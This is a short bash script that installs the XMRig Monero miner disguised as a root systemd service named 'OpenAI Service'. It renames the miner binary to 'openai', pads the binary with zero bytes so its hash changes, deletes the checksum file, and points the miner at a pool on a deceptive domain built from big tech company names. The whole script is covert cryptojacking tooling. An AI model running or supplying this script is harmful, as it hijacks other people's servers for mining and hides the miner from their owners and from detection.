#!/bin/bash

systemctl stop openai.service && killall -9 openai
rm -rf /root/openai
rm -rf /etc/systemd/system/openai.service
U=$1
latest=`wget -qO- -t1 -T2 "https://api.github.com/repos/xmrig/xmrig/releases/latest" | grep "tag_name" | head -n 1 | awk -F ":" '{print $2}' | sed 's/\"//g;s/,//g;s/ //g' | awk -F "v" '{print $2}'`
wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v$latest/xmrig-$latest-linux-static-x64.tar.gz 
tar -zxvf 1.tar.gz
mv xmrig-$latest openai
mv openai/xmrig openai/openai
random_number=$((RANDOM % 288 + 88))
echo $random_number
rm -rf 1.tar.gz
cd openai && rm -rf SHA256SUMS
for i in $(seq 1 $random_number); do
  echo -n "0" >> /root/openai/openai
done

cat > /etc/systemd/system/openai.service <<EOL
[Unit]
Description=OpenAI Service
After=network.target

[Service]
Type=simple
ExecStart=/root/openai/openai -o skfdjhgsdktjh.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:1123 -u $1 -p $2 -a rx/0 -k 
ExecStop=/usr/bin/killall -9 openai
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
EOL

systemctl daemon-reload
systemctl enable openai.service
systemctl start openai.service
sleep 2
systemctl status openai.service
